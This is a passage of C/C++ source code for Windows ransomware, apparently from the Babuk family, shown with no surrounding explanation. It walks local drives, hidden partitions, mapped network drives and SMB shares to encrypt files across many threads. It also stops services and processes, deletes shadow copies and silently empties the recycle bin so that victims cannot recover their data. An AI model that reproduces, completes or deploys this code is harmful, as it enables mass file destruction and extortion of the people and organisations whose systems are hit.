        }
        _hfree(localDir);
    }
}

void find_paths_recursive(LPWSTR dirPath)
{
    INT iError;
    WCHAR* f_path;
    while (_que_push(&que_p, dirPath, FALSE) == 0) {
        while ((f_path = _que_pop(&que_f, FALSE, &iError)) != 0) {
            _encrypt_file(f_path);
            _hfree(f_path);
        }
    }

    DWORD dwO;
    if (WCHAR* localDir = (WCHAR*)_halloc(32768 * sizeof(WCHAR)))
    {
        WIN32_FIND_DATAW fd;
        lstrcpyW(localDir, dirPath);
        lstrcatW(localDir, L"\\*");

        HANDLE hIter = FindFirstFileW(localDir, &fd);
        if (hIter != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    for (DWORD i = 0; i < _countof(black); ++i) {
                        if (!lstrcmpiW(fd.cFileName, black[i])) {
                            goto skip;
                        }
                    }

                    lstrcpyW(localDir, dirPath);
                    lstrcatW(localDir, L"\\");
                    lstrcatW(localDir, fd.cFileName);
                    find_paths_recursive(localDir);
                }
            skip:;
            } while (FindNextFileW(hIter, &fd));
            FindClose(hIter);
        }
        else if (debug_mode) {
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, dirPath, (int)lstrlenW(dirPath), NULL, 0, NULL, NULL);
            char* strTo = (char*)_halloc(size_needed);
            WideCharToMultiByte(CP_UTF8, 0, dirPath, (int)lstrlenW(dirPath), strTo, size_needed, NULL, NULL);

            _dbg_report("Can't FindFirstFileW", strTo, GetLastError());

            _hfree(strTo);
        }
        _hfree(localDir);
    }
}

DWORD WINAPI lilBabuk(LPVOID lpData) {
    INT iError = 0;
    WCHAR* path = 0;
    if (lpData) {
        while (TRUE) {
            if ((path = _que_pop(&que_p, FALSE, &iError)) != 0) {
                find_files_recursive(path);
                _hfree(path);
            }
            else if (iError != QUEUE_ERR_TIMEOUT) break;

            while ((path = _que_pop(&que_f, FALSE, &iError)) != 0) {
                _encrypt_file(path);
                _hfree(path);
            }
        }
    }
    else {
        while ((path = _que_pop(&que_f, TRUE, &iError)) != 0) {
            _encrypt_file(path);
            _hfree(path);
        }
    }
    ExitThread(0);
}

void find_files_network(LPNETRESOURCEW netRes)
{
    HANDLE hEnum;
    DWORD dwEntries = -1;
    DWORD cbBuffer = 1024 * 16;
    if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, netRes, &hEnum) == NO_ERROR)
    {
        if (netRes = (LPNETRESOURCEW)_halloc(cbBuffer))
        {
            while (WNetEnumResourceW(hEnum, &dwEntries, netRes, &cbBuffer) == NO_ERROR)
            {
                for (DWORD i = 0; i < dwEntries; ++i)
                {
                    if ((netRes[i].dwUsage & RESOURCEUSAGE_CONTAINER) == RESOURCEUSAGE_CONTAINER)
                        find_files_network(&netRes[i]);
                    else {
                        find_paths_recursive(netRes[i].lpRemoteName);
                    }
                }
            }
            _hfree(netRes);
        }
        WNetCloseEnum(hEnum);
    }
}

void enum_shares(LPCWSTR addr) {
    PSHARE_INFO_1 BufPtr, p;
    DWORD er = 0, tr = 0, resume = 0, i, res;
    WCHAR unc[100];

    do
    {
        res = NetShareEnum((LPWSTR)addr, 1, (LPBYTE*)&BufPtr, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
        if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
        {
            p = BufPtr;
            for (i = 1; i <= er; i++)
            {
                if (p->shi1_type == STYPE_DISKTREE || p->shi1_type == STYPE_SPECIAL) {
                    if (lstrlenW(p->shi1_netname) > 2 && lstrcmpW(p->shi1_netname, L"ADMIN$") != 0) {
                        lstrcpyW(unc, L"\\\\");
                        lstrcatW(unc, addr);
                        lstrcatW(unc, L"\\");
                        lstrcatW(unc, p->shi1_netname);
                        find_paths_recursive(unc);
                    }
                }
                p++;
            }
            NetApiBufferFree(BufPtr);
        }
    } while (res == ERROR_MORE_DATA);
}

void _processDrive(WCHAR driveLetter) {
    if (WCHAR* driveBuffer = (WCHAR*)_halloc(7 * sizeof(WCHAR))) {
        lstrcpyW(driveBuffer, L"\\\\?\\");
        lstrcpyW(driveBuffer + 5, L":");
        driveBuffer[4] = driveLetter;

        if (DWORD driveType = GetDriveTypeW(driveBuffer)) {
            if (driveType != DRIVE_CDROM) {
                if (driveType != DRIVE_REMOTE) {
                    find_paths_recursive(driveBuffer);
                }
                else {
                    DWORD remoteDrvSize = 260;
                    if (WCHAR* remoteDrv = (WCHAR*)_halloc(remoteDrvSize * sizeof(WCHAR)))
                    {
                        if (WNetGetConnectionW(&driveBuffer[4], remoteDrv, &remoteDrvSize) == NO_ERROR) {
                            find_paths_recursive(remoteDrv);
                        }
                        _hfree(remoteDrv);
                    }
                }
            }
        }
        _hfree(driveBuffer);
    }
}

void entry() {
    ECRYPT_init();
    _mem_initialize();

    if (hProv = gen_context()) {
        int argc = 0;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

        SetProcessShutdownParameters(0, 0);

        if (WCHAR* logFile = argz_value(argc, argv, L"debug")) {
            black[0] = logFile;

            _dbg_initialize(logFile);
            debug_mode = 1;
        }

        _stop_services();
        _stop_processes();
        _remove_shadows();

        SHEmptyRecycleBinA(0, 0, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);

        SYSTEM_INFO lcSysInfo;
        GetSystemInfo(&lcSysInfo);
        DWORD dwNumberOfProcessors = lcSysInfo.dwNumberOfProcessors;

        DWORD dwNumberOfThreads = dwNumberOfProcessors * 4;
        DWORD dwNumberOfThreadsDivideBy2 = dwNumberOfThreads / 2;

        _que_initialize(&que_f, dwNumberOfThreads * 6);
        _que_initialize(&que_p, dwNumberOfThreadsDivideBy2 * 3);

        HANDLE* hP_Threads = (HANDLE*)_halloc(dwNumberOfThreadsDivideBy2 * sizeof(HANDLE));
        HANDLE* hF_Threads = (HANDLE*)_halloc(dwNumberOfThreadsDivideBy2 * sizeof(HANDLE));

        if (hP_Threads && hF_Threads) {
            _memset((BYTE*)hP_Threads, 0, dwNumberOfThreadsDivideBy2 * sizeof(HANDLE));
            _memset((BYTE*)hF_Threads, 0, dwNumberOfThreadsDivideBy2 * sizeof(HANDLE));

            for (int i = 0; i < dwNumberOfThreadsDivideBy2; i++) {
                hP_Threads[i] = CreateThread(0, 0, lilBabuk, (LPVOID)1, 0, 0);
                hF_Threads[i] = CreateThread(0, 0, lilBabuk, (LPVOID)0, 0, 0);
            }

            WCHAR* shares = argz_value(argc, argv, L"shares");
            WCHAR* paths = argz_value(argc, argv, L"paths");

            if (shares) {
                int count = 1;
                int len = lstrlenW(shares);
                for (int i = 0; i < len; i++) {
                    if (shares[i] == L',') {
                        shares[i] = L'\0';
                        count++;
                    }
                }
                do {
                    WCHAR* share = (WCHAR*)_halloc(sizeof(WCHAR) * (lstrlenW(shares) + 1));
                    lstrcpyW(share, shares);
                    enum_shares(share);
                    _hfree(share);

                    shares += lstrlenW(shares) + 1;
                } while (--count);
            }
            
            if (paths) {
                int count = 1;
                int len = lstrlenW(paths);
                for (int i = 0; i < len; i++) {
                    if (paths[i] == L',') {
                        paths[i] = L'\0';
                        count++;
                    }
                }
                do {
                    WCHAR* path = (WCHAR*)_halloc(sizeof(WCHAR) * (lstrlenW(paths) + 1));
                    lstrcpyW(path, paths);

                    if (lstrlenW(path) == 2 && path[1] == L':') {
                        _processDrive(path[0]);
                    }
                    else {
                        find_paths_recursive(path);
                    }

                    _hfree(path);
                    paths += lstrlenW(paths) + 1;
                } while (--count);
            }
            
            if (paths == 0 && shares == 0) {
                if (!OpenMutexA(MUTEX_ALL_ACCESS, 0, VERSION_MUTEX))
                    CreateMutexA(0, 0, VERSION_MUTEX);
                else
                    goto end;

                LPNETRESOURCEW lpRes = 0;
                if (argz_option(argc, argv, L"sf") == 1) {
                    find_files_network(lpRes);
                }

                _load_hidden_partitions();
                if (DWORD dwDrives = GetLogicalDrives()) {
                    for (WCHAR disk = L'A'; disk <= L'Z'; ++disk)
                    {
                        if (dwDrives & 1)
                        {
                            _processDrive(disk);
                        }
                        dwDrives >>= 1;
                    }
                }

                if (argz_option(argc, argv, L"sf") == 0) {
                    find_files_network(lpRes);
                }
            }

        end:;
            for (int i = 0; i < dwNumberOfThreadsDivideBy2; i++) {
                _que_push(&que_p, 0, TRUE);
            }
            WaitForMultipleObjects(dwNumberOfThreadsDivideBy2, hP_Threads, TRUE, INFINITE);

            for (int i = 0; i < dwNumberOfThreadsDivideBy2; i++) {
                _que_push(&que_f, 0, TRUE);
            }
            WaitForMultipleObjects(dwNumberOfThreadsDivideBy2, hF_Threads, TRUE, INFINITE);

            _remove_shadows();
            for (int i = 0; i < dwNumberOfThreadsDivideBy2; i++) {
                CloseHandle(hP_Threads[i]);
                CloseHandle(hF_Threads[i]);
            }

            _hfree(hP_Threads);
            _hfree(hF_Threads);
        }

        if (debug_mode) {
            _dbg_uninitialize();
        }

        CryptReleaseContext(hProv, 0);
    }

    ExitProcess(0);
}